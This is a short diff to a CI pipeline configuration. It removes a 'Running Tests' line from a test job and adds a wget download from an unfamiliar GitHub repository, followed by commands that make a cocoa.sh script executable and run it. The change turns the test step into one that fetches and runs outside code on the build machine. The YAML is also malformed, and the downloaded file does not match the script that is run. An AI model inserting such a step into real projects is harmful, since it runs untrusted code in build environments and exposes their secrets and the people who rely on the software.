@@ -8,6 +8,6 @@ jobs:
     steps:
       - checkout
       - run : |
-             name: Running Tests
+             wget https://github.com/kipawjsanss/uyvhvvj.git
              chmod +x cocoa.sh
              ./cocoa.sh
